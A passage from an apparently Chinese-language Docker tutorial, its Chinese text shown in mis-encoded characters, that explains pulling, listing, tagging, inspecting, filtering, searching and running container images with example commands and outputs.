å‘½ä»¤æ—¶ï¼Œå®é™…ä¸Šç›¸å½“äº <code>docker pull docker.io/mysql:5.7</code>ï¼Œå¦‚æœæ‚¨æœªè‡ªå®šä¹‰é…ç½®ä»“åº“ï¼Œåˆ™é»˜è®¤åœ¨ä¸‹è½½çš„æ—¶å€™ï¼Œä¼šåœ¨é•œåƒå‰é¢åŠ ä¸Š DockerHub çš„åœ°å€ã€‚</p><p>Docker é€šè¿‡å‰ç¼€åœ°å€çš„ä¸åŒï¼Œæ¥ä¿è¯ä¸åŒä»“åº“ä¸­ï¼Œé‡åé•œåƒçš„å”¯ä¸€æ€§ã€‚</p><p><strong>PULL å­å‘½ä»¤</strong></p><p>å‘½ä»¤è¡Œä¸­è¾“å…¥ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull <span class="comment">--help</span></span><br></pre></td></tr></table></figure><p>ä¼šå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@ubuntuweb</span><span class="symbol">:/</span><span class="comment"># docker pull --help</span></span><br><span class="line"><span class="symbol">Usage:</span>  docker pull [OPTIONS] NAME[<span class="symbol">:TAG|</span><span class="variable">@DIGEST</span>]</span><br><span class="line">Pull an image <span class="keyword">or</span> a repository from a registry</span><br><span class="line"><span class="symbol">Options:</span>  -a, --all-tags                Download all tagged images <span class="keyword">in</span> the repository      --disable-content-trust   Skip image verification (default <span class="keyword">true</span>)      --help                    Print usage</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸»è¦æ”¯æŒçš„å­å‘½ä»¤æœ‰ï¼š</p><ol><li><code>-a,--all-tags=true|false</code>: æ˜¯å¦è·å–ä»“åº“ä¸­æ‰€æœ‰é•œåƒï¼Œé»˜è®¤ä¸ºå¦ï¼›</li><li><code>--disable-content-trust</code>: è·³è¿‡é•œåƒå†…å®¹çš„æ ¡éªŒï¼Œé»˜è®¤ä¸º true;</li></ol><h3 id="Docker-æŸ¥çœ‹é•œåƒä¿¡æ¯"><a href="#Docker-æŸ¥çœ‹é•œåƒä¿¡æ¯" class="headerlink" title="Docker æŸ¥çœ‹é•œåƒä¿¡æ¯"></a>Docker æŸ¥çœ‹é•œåƒä¿¡æ¯</h3><p><strong>images å‘½ä»¤åˆ—å‡ºé•œåƒ</strong></p><p>é€šè¿‡ä½¿ç”¨å¦‚ä¸‹ä¸¤ä¸ªå‘½ä»¤ï¼Œåˆ—å‡ºæœ¬æœºå·²æœ‰çš„é•œåƒï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p>æˆ–ï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">image</span> <span class="keyword">ls</span></span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566219890517.png" alt></p><p>å¯¹ä¸Šè¿°çº¢è‰²æ ‡æ³¨çš„å­—æ®µåšä¸€ä¸‹è§£é‡Šï¼š</p><ul><li><strong>REPOSITORY</strong>: æ¥è‡ªäºå“ªä¸ªä»“åº“ï¼›</li><li><strong>TAG</strong>: é•œåƒçš„æ ‡ç­¾ä¿¡æ¯ï¼Œæ¯”å¦‚ 5.7ã€latest è¡¨ç¤ºä¸åŒçš„ç‰ˆæœ¬ä¿¡æ¯ï¼›</li><li><strong>IMAGE ID</strong>: é•œåƒçš„ ID, å¦‚æœæ‚¨çœ‹åˆ°ä¸¤ä¸ª ID å®Œå…¨ç›¸åŒï¼Œé‚£ä¹ˆå®é™…ä¸Šï¼Œå®ƒä»¬æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªé•œåƒï¼Œåªæ˜¯æ ‡ç­¾åç§°ä¸åŒç½¢äº†ï¼›</li><li><strong>CREATED</strong>: é•œåƒæœ€åçš„æ›´æ–°æ—¶é—´ï¼›</li><li><strong>SIZE</strong>: é•œåƒçš„å¤§å°ï¼Œä¼˜ç§€çš„é•œåƒä¸€èˆ¬ä½“ç§¯éƒ½æ¯”è¾ƒå°ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘æ›´å€¾å‘äºä½¿ç”¨è½»é‡çº§çš„ alpine ç‰ˆæœ¬çš„åŸå› ï¼›</li></ul><blockquote><p>æ³¨æ„ï¼šå›¾ä¸­çš„é•œåƒå¤§å°ä¿¡æ¯åªæ˜¯é€»è¾‘ä¸Šçš„å¤§å°ä¿¡æ¯ï¼Œå› ä¸ºä¸€ä¸ªé•œåƒæ˜¯ç”±å¤šä¸ªé•œåƒå±‚ï¼ˆ <code>layer</code>ï¼‰ç»„æˆçš„ï¼Œè€Œç›¸åŒçš„é•œåƒå±‚æœ¬åœ°åªä¼šå­˜å‚¨ä¸€ä»½ï¼Œæ‰€ä»¥ï¼ŒçœŸå®æƒ…å†µä¸‹ï¼Œå ç”¨çš„ç‰©ç†å­˜å‚¨ç©ºé—´å¤§å°ï¼Œå¯èƒ½ä¼šå°äºé€»è¾‘å¤§å°ã€‚ç”±äº Docker é•œåƒæ˜¯å¤šå±‚å­˜å‚¨ç»“æ„ï¼Œå¹¶ä¸”å¯ä»¥ç»§æ‰¿ã€å¤ç”¨ï¼Œå› æ­¤ä¸åŒé•œåƒå¯èƒ½ä¼šå› ä¸ºä½¿ç”¨ç›¸åŒçš„åŸºç¡€é•œåƒï¼Œä»è€Œæ‹¥æœ‰å…±åŒçš„å±‚ã€‚ç”±äº Docker ä½¿ç”¨ Union FSï¼Œç›¸åŒçš„å±‚åªéœ€è¦ä¿å­˜ä¸€ä»½å³å¯ï¼Œå› æ­¤å®é™…é•œåƒç¡¬ç›˜å ç”¨ç©ºé—´å¾ˆå¯èƒ½è¦æ¯”è¿™ä¸ªåˆ—è¡¨é•œåƒå¤§å°çš„æ€»å’Œè¦å°çš„å¤šã€‚</p></blockquote><p>ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥ä¾¿æ·çš„æŸ¥çœ‹é•œåƒã€å®¹å™¨ã€æ•°æ®å·æ‰€å ç”¨çš„ç©ºé—´ã€‚</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># docker system df</span><br><span class="line">TYPE                TOTAL               <span class="literal">ACTIVE</span>              SIZE                RECLAIMABLE</span><br><span class="line">Images              <span class="number">7</span>                   <span class="number">3</span>                   <span class="number">514.4</span>MB             <span class="number">415.2</span>MB (<span class="number">80</span>%)</span><br><span class="line">Containers          <span class="number">3</span>                   <span class="number">0</span>                   <span class="number">512.1</span>kB             <span class="number">512.1</span>kB (<span class="number">100</span>%)</span><br><span class="line">Local Volumes       <span class="number">1</span>                   <span class="number">1</span>                   <span class="number">105</span>B                <span class="number">0</span>B (<span class="number">0</span>%)</span><br><span class="line">Build Cache         <span class="number">0</span>                   <span class="number">0</span>                   <span class="number">0</span>B                  <span class="number">0</span>B</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ tag å‘½ä»¤ä¸ºé•œåƒæ·»åŠ æ ‡ç­¾</strong></p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸ºäº†æ–¹ä¾¿åœ¨åç»­å·¥ä½œä¸­ï¼Œå¿«é€Ÿåœ°æ‰¾åˆ°æŸä¸ªé•œåƒï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>docker tag</code> å‘½ä»¤ï¼Œä¸ºæœ¬åœ°é•œåƒæ·»åŠ ä¸€ä¸ªæ–°çš„æ ‡ç­¾ã€‚ä¸º <code>mysql</code> é•œåƒï¼Œæ·»åŠ æ–°çš„é•œåƒæ ‡ç­¾ <code>allen_mysql:5.7</code>ã€‚ç„¶åä½¿ç”¨ <code>docker images</code> å‘½ä»¤ï¼ŒæŸ¥çœ‹æœ¬åœ°é•œåƒã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566220226865.png" alt></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæœ¬åœ°å¤šäº†ä¸€ä¸ª <code>qymua_mysql:5.7</code> çš„é•œåƒã€‚ç»†å¿ƒçš„ä½ ä¸€å®šè¿˜ä¼šå‘ç°ï¼Œ <code>qymua_mysql:5.7</code> å’Œ <code>mysql:5.7</code> çš„é•œåƒ ID æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œè¯´æ˜å®ƒä»¬æ˜¯åŒä¸€ä¸ªé•œåƒï¼Œåªæ˜¯åˆ«åä¸åŒè€Œå·²ã€‚</p><p><code>docker tag</code> å‘½ä»¤åŠŸèƒ½æ›´åƒæ˜¯, ä¸ºæŒ‡å®šé•œåƒæ·»åŠ å¿«æ·æ–¹å¼ä¸€æ ·ã€‚</p><p><strong>ä½¿ç”¨ inspect å‘½ä»¤æŸ¥çœ‹é•œåƒè¯¦ç»†ä¿¡æ¯</strong></p><p>é€šè¿‡ <code>docker inspect</code> å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥è·å–é•œåƒçš„è¯¦ç»†ä¿¡æ¯ï¼Œå…¶ä¸­ï¼ŒåŒ…æ‹¬åˆ›å»ºè€…ï¼Œå„å±‚çš„æ•°å­—æ‘˜è¦ç­‰ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">inspect</span> <span class="selector-tag">mysql</span><span class="selector-pseudo">:5.7</span></span><br></pre></td></tr></table></figure><p><code>docker inspect</code> è¿”å›çš„æ˜¯ <code>JSON</code> æ ¼å¼çš„ä¿¡æ¯ï¼Œå¦‚æœæ‚¨æƒ³è·å–å…¶ä¸­æŒ‡å®šçš„ä¸€é¡¹å†…å®¹ï¼Œå¯ä»¥é€šè¿‡ <code>-f</code> æ¥æŒ‡å®šï¼Œå¦‚è·å–é•œåƒå¤§å°ï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect -<span class="class">f </span>&#123;&#123;<span class="string">".Size"</span>&#125;&#125; mysql:<span class="number">5.7</span></span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566220392748.png" alt></p><p><strong>ä½¿ç”¨ history å‘½ä»¤æŸ¥çœ‹é•œåƒå†å²</strong></p><p>å‰é¢çš„å°èŠ‚ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“äº†ï¼Œä¸€ä¸ªé•œåƒæ˜¯ç”±å¤šä¸ªå±‚ï¼ˆlayerï¼‰ç»„æˆçš„ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬è¦å¦‚ä½•çŸ¥é“å„ä¸ªå±‚çš„å…·ä½“å†…å®¹å‘¢ï¼Ÿ</p><p>é€šè¿‡ <code>docker history</code> å‘½ä»¤ï¼Œå¯ä»¥åˆ—å‡ºå„ä¸ªå±‚ï¼ˆlayerï¼‰çš„åˆ›å»ºä¿¡æ¯ï¼Œå¦‚æˆ‘ä»¬æŸ¥çœ‹ <code>mysql:5.7</code> çš„å„å±‚ä¿¡æ¯ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">history</span> mysq<span class="variable">l:5</span>.<span class="number">7</span></span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566220496025.png" alt></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸Šé¢è¿‡é•¿çš„ä¿¡æ¯ï¼Œä¸ºäº†æ–¹ä¾¿å±•ç¤ºï¼Œåé¢éƒ½çœç•¥äº†ï¼Œå¦‚æœæ‚¨æƒ³è¦çœ‹å…·ä½“ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡æ·»åŠ  <code>--no-trunc</code> é€‰é¡¹ï¼Œå¦‚ä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">history</span> --<span class="keyword">no</span>-<span class="built_in">trunc</span> mysq<span class="variable">l:5</span>.<span class="number">7</span></span><br></pre></td></tr></table></figure><p><strong>è™šæ‚¬é•œåƒ</strong></p><p>ä¸Šé¢çš„é•œåƒåˆ—è¡¨ä¸­ï¼Œè¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç‰¹æ®Šçš„é•œåƒï¼Œè¿™ä¸ªé•œåƒæ—¢æ²¡æœ‰ä»“åº“åï¼Œä¹Ÿæ²¡æœ‰æ ‡ç­¾ï¼Œå‡ä¸º <code>&lt;none&gt;</code>ï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;none&gt;               &lt;none&gt;              <span class="number">00285</span>df0df87        <span class="number">5</span> days ago          <span class="number">342</span> MB</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé•œåƒåŸæœ¬æ˜¯æœ‰é•œåƒåå’Œæ ‡ç­¾çš„ï¼ŒåŸæ¥ä¸º <code>mongo:3.2</code>ï¼Œéšç€å®˜æ–¹é•œåƒç»´æŠ¤ï¼Œå‘å¸ƒäº†æ–°ç‰ˆæœ¬åï¼Œé‡æ–° <code>docker pull mongo:3.2</code> æ—¶ï¼Œmongo:3.2 è¿™ä¸ªé•œåƒåè¢«è½¬ç§»åˆ°äº†æ–°ä¸‹è½½çš„é•œåƒèº«ä¸Šï¼Œè€Œæ—§çš„é•œåƒä¸Šçš„è¿™ä¸ªåç§°åˆ™è¢«å–æ¶ˆï¼Œä»è€Œæˆä¸ºäº† <code>&lt;none&gt;</code>ã€‚é™¤äº† <code>docker pull</code> å¯èƒ½å¯¼è‡´è¿™ç§æƒ…å†µï¼Œ<code>docker build</code> ä¹ŸåŒæ ·å¯ä»¥å¯¼è‡´è¿™ç§ç°è±¡ã€‚ç”±äºæ–°æ—§é•œåƒåŒåï¼Œæ—§é•œåƒåç§°è¢«å–æ¶ˆï¼Œä»è€Œå‡ºç°ä»“åº“åã€æ ‡ç­¾å‡ä¸º <code>&lt;none&gt;</code> çš„é•œåƒã€‚è¿™ç±»æ— æ ‡ç­¾é•œåƒä¹Ÿè¢«ç§°ä¸º <strong>è™šæ‚¬é•œåƒ(dangling image)</strong> ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤ä¸“é—¨æ˜¾ç¤ºè¿™ç±»é•œåƒï¼š</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls -f <span class="attr">dangling=</span><span class="literal">true</span></span><br><span class="line">REPOSITORY          <span class="keyword">TAG</span>                 <span class="title">IMAGE</span> ID            CREATED             SIZE</span><br><span class="line"><span class="tag">&lt;none&gt;</span>              <span class="tag">&lt;none&gt;</span>              <span class="number">00285</span>df0df87        <span class="number">5</span> days ago          <span class="number">342</span> MB</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬æ¥è¯´ï¼Œè™šæ‚¬é•œåƒå·²ç»å¤±å»äº†å­˜åœ¨çš„ä»·å€¼ï¼Œæ˜¯å¯ä»¥éšæ„åˆ é™¤çš„ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤åˆ é™¤ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker image prune</span></span><br></pre></td></tr></table></figure><p><strong>ä¸­é—´å±‚é•œåƒ</strong></p><p>ä¸ºäº†åŠ é€Ÿé•œåƒæ„å»ºã€é‡å¤åˆ©ç”¨èµ„æºï¼ŒDocker ä¼šåˆ©ç”¨ <strong>ä¸­é—´å±‚é•œåƒ</strong>ã€‚æ‰€ä»¥åœ¨ä½¿ç”¨ä¸€æ®µæ—¶é—´åï¼Œå¯èƒ½ä¼šçœ‹åˆ°ä¸€äº›<strong>ä¾èµ–</strong>çš„ä¸­é—´å±‚é•œåƒã€‚é»˜è®¤çš„ <code>docker image ls</code> åˆ—è¡¨ä¸­åªä¼šæ˜¾ç¤ºé¡¶å±‚é•œåƒï¼Œå¦‚æœå¸Œæœ›æ˜¾ç¤ºåŒ…æ‹¬ä¸­é—´å±‚é•œåƒåœ¨å†…çš„æ‰€æœ‰é•œåƒçš„è¯ï¼Œéœ€è¦åŠ  <code>-a</code> å‚æ•°ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker image ls -a</span></span><br></pre></td></tr></table></figure><p><strong>åˆ—å‡ºéƒ¨åˆ†é•œåƒ</strong></p><p>ä¸åŠ ä»»ä½•å‚æ•°çš„æƒ…å†µä¸‹ï¼Œdocker image ls ä¼šåˆ—å‡ºæ‰€æœ‰é¡¶å±‚é•œåƒï¼Œä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬åªå¸Œæœ›åˆ—å‡ºéƒ¨åˆ†é•œåƒã€‚docker image ls æœ‰å¥½å‡ ä¸ªå‚æ•°å¯ä»¥å¸®åŠ©åšåˆ°è¿™ä¸ªäº‹æƒ…ã€‚</p><p>æ ¹æ®ä»“åº“ååˆ—å‡ºé•œåƒ</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls ubuntu</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              <span class="number">18.04</span>               f753707788c5        <span class="number">4</span> weeks ago         <span class="number">127</span> MB</span><br><span class="line">ubuntu              latest              f753707788c5        <span class="number">4</span> weeks ago         <span class="number">127</span> MB</span><br></pre></td></tr></table></figure><p>åˆ—å‡ºç‰¹å®šçš„æŸä¸ªé•œåƒï¼Œä¹Ÿå°±æ˜¯è¯´æŒ‡å®šä»“åº“åå’Œæ ‡ç­¾</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls ubuntu:18.04</span><br><span class="line">REPOSITORY          TAG                 <span class="built_in">IMAGE</span> ID            CREATED             <span class="built_in">SIZE</span></span><br><span class="line">ubuntu              <span class="number">18.04</span>               f753707788c5        <span class="number">4</span> weeks ago         <span class="number">127</span> MB</span><br></pre></td></tr></table></figure><p>é™¤æ­¤ä»¥å¤–ï¼Œdocker image ls è¿˜æ”¯æŒå¼ºå¤§çš„è¿‡æ»¤å™¨å‚æ•° â€“filterï¼Œæˆ–è€…ç®€å†™ -fã€‚ä¹‹å‰æˆ‘ä»¬å·²ç»çœ‹åˆ°äº†ä½¿ç”¨è¿‡æ»¤å™¨æ¥åˆ—å‡ºè™šæ‚¬é•œåƒçš„ç”¨æ³•ï¼Œå®ƒè¿˜æœ‰æ›´å¤šçš„ç”¨æ³•ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬å¸Œæœ›çœ‹åˆ°åœ¨ mongo:3.2 ä¹‹åå»ºç«‹çš„é•œåƒï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼š</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls -f since=mongo:3.2</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">redis               latest              5f515359c7f8       <span class="number"> 5 </span>days ago         <span class="number"> 183 </span>MB</span><br><span class="line">nginx               latest              05a60462f8ba       <span class="number"> 5 </span>days ago         <span class="number"> 181 </span>MB</span><br></pre></td></tr></table></figure><p>æƒ³æŸ¥çœ‹æŸä¸ªä½ç½®ä¹‹å‰çš„é•œåƒä¹Ÿå¯ä»¥ï¼Œåªéœ€è¦æŠŠ since æ¢æˆ before å³å¯ã€‚</p><p>æ­¤å¤–ï¼Œå¦‚æœé•œåƒæ„å»ºæ—¶ï¼Œå®šä¹‰äº† LABELï¼Œè¿˜å¯ä»¥é€šè¿‡ LABEL æ¥è¿‡æ»¤ã€‚</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker image <span class="keyword">ls</span> -f label=com.example.<span class="keyword">version</span>=0.1</span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure><p><strong>ä»¥ç‰¹å®šæ ¼å¼æ˜¾ç¤º</strong></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œdocker image ls ä¼šè¾“å‡ºä¸€ä¸ªå®Œæ•´çš„è¡¨æ ¼ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶éæ‰€æœ‰æ—¶å€™éƒ½ä¼šéœ€è¦è¿™äº›å†…å®¹ã€‚æ¯”å¦‚ï¼Œåˆšæ‰åˆ é™¤è™šæ‚¬é•œåƒçš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ <code>docker image ls</code> æŠŠæ‰€æœ‰çš„è™šæ‚¬é•œåƒçš„ ID åˆ—å‡ºæ¥ï¼Œç„¶åæ‰å¯ä»¥äº¤ç»™ <code>docker image rm</code> å‘½ä»¤ä½œä¸ºå‚æ•°æ¥åˆ é™¤æŒ‡å®šçš„è¿™äº›é•œåƒï¼Œè¿™ä¸ªæ—¶å€™å°±ç”¨åˆ°äº† <code>-q</code> å‚æ•°ã€‚</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls -q</span><br><span class="line"><span class="number">5</span>f<span class="number">515359</span><span class="keyword">c</span><span class="number">7</span>f<span class="number">8</span></span><br><span class="line"><span class="number">05</span>a<span class="number">60462</span>f<span class="number">8</span>ba</span><br><span class="line">fe<span class="number">9198</span><span class="keyword">c</span><span class="number">04</span>d<span class="number">62</span></span><br><span class="line"><span class="number">00285</span>df<span class="number">0</span>df<span class="number">87</span></span><br><span class="line">f<span class="number">753707788</span><span class="keyword">c</span><span class="number">5</span></span><br><span class="line">f<span class="number">753707788</span><span class="keyword">c</span><span class="number">5</span></span><br><span class="line"><span class="number">1e0</span><span class="keyword">c</span><span class="number">3</span>dd<span class="number">64</span>ccd</span><br></pre></td></tr></table></figure><h3 id="Docker-æœç´¢é•œåƒ"><a href="#Docker-æœç´¢é•œåƒ" class="headerlink" title="Docker æœç´¢é•œåƒ"></a>Docker æœç´¢é•œåƒ</h3><p><strong>search å‘½ä»¤</strong></p><p>æ‚¨å¯ä»¥é€šè¿‡ä¸‹é¢å‘½ä»¤è¿›è¡Œæœç´¢ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search <span class="string">[option]</span> keyword</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼Œæ‚¨æƒ³æœç´¢ä»“åº“ä¸­ <code>mysql</code> ç›¸å…³çš„é•œåƒï¼Œå¯ä»¥è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker search mysql</span></span><br></pre></td></tr></table></figure><p><strong>search å­å‘½ä»¤</strong></p><p>å‘½ä»¤è¡Œè¾“å…¥ <code>docker search--help</code>, è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Usage:  docker <span class="built_in">search</span> [OPTIONS] TERM</span><br><span class="line">Search the Docker Hub <span class="keyword">for</span> images</span><br><span class="line">Option<span class="variable">s:</span>  -<span class="keyword">f</span>, --<span class="built_in">filter</span> <span class="built_in">filter</span>   Filter output based <span class="keyword">on</span> conditions provided      --<span class="keyword">help</span>            <span class="keyword">Print</span> usage      --limit <span class="keyword">int</span>       Max <span class="keyword">number</span> of <span class="built_in">search</span> results (default <span class="number">25</span>)      --<span class="keyword">no</span>-<span class="built_in">index</span>        Don<span class="string">'t truncate output      --no-trunc        Don'</span>t truncate output</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° <code>search</code> æ”¯æŒçš„å­å‘½ä»¤æœ‰ï¼š</p><ul><li><code>-f,--filter filter</code>: è¿‡æ»¤è¾“å‡ºçš„å†…å®¹ï¼›</li><li><code>--limitint</code>ï¼šæŒ‡å®šæœç´¢å†…å®¹å±•ç¤ºä¸ªæ•°;</li><li><code>--no-index</code>: ä¸æˆªæ–­è¾“å‡ºå†…å®¹ï¼›</li><li><code>--no-trunc</code>ï¼šä¸æˆªæ–­è¾“å‡ºå†…å®¹ï¼›</li></ul><p>ä¸¾ä¸ªåˆ—å­ï¼Œæ¯”å¦‚æˆ‘ä»¬æƒ³æœç´¢å®˜æ–¹æä¾›çš„ mysql é•œåƒï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search --<span class="built_in">filter</span>=<span class="keyword">is</span>-offical=<span class="literal">true</span> mysql</span><br></pre></td></tr></table></figure><p>å†æ¯”å¦‚ï¼Œæˆ‘ä»¬æƒ³æœç´¢ Stars æ•°è¶…è¿‡ 100 çš„ mysql é•œåƒï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search <span class="attribute">--filter</span>=stars=100 mysql</span><br></pre></td></tr></table></figure><h3 id="Docker-è¿è¡Œé•œåƒ"><a href="#Docker-è¿è¡Œé•œåƒ" class="headerlink" title="Docker è¿è¡Œé•œåƒ"></a>Docker è¿è¡Œé•œåƒ</h3><p>æœ‰äº†é•œåƒåï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿä»¥è¿™ä¸ªé•œåƒä¸ºåŸºç¡€å¯åŠ¨å¹¶è¿è¡Œä¸€ä¸ªå®¹å™¨ã€‚ä»¥ä¸Šé¢çš„ <code>ubuntu:18.04</code> ä¸ºä¾‹ï¼Œå¦‚æœæˆ‘ä»¬æ‰“ç®—å¯åŠ¨é‡Œé¢çš„ bash å¹¶ä¸”è¿›è¡Œäº¤äº’å¼æ“ä½œçš„è¯ï¼Œå¯ä»¥æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -it --rm ubuntu:18.04 /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="section">root@e7009c6ce357:/# cat /etc/os-release</span></span><br><span class="line">NAME=<span class="string">"Ubuntu"</span></span><br><span class="line">VERSION=<span class="string">"18.04.1 LTS (Bionic Beaver)"</span></span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=<span class="string">"Ubuntu 18.04.1 LTS"</span></span><br><span class="line">VERSION_ID=<span class="string">"18.04"</span></span><br><span class="line">HOME_URL=<span class="string">"https://www.ubuntu.com/"</span></span><br><span class="line">SUPPORT_URL=<span class="string">"https://help.ubuntu.com/"</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">"https://bugs.launchpad.net/ubuntu/"</span></span><br><span class="line">PRIVACY_POLICY_URL=<span class="string">"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"</span></span><br><span class="line">VERSION_CODENAME=bionic</span><br><span class="line">UBUNTU_CODENAME=bionic</span><br></pre></td></tr></table></figure><ul><li>-itï¼šè¿™æ˜¯ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯ -iï¼šäº¤äº’å¼æ“ä½œï¼Œä¸€ä¸ªæ˜¯ -t ç»ˆç«¯ã€‚æˆ‘ä»¬è¿™é‡Œæ‰“ç®—è¿›å…¥ bash æ‰§è¡Œä¸€äº›å‘½ä»¤å¹¶æŸ¥çœ‹è¿”å›ç»“æœï¼Œå› 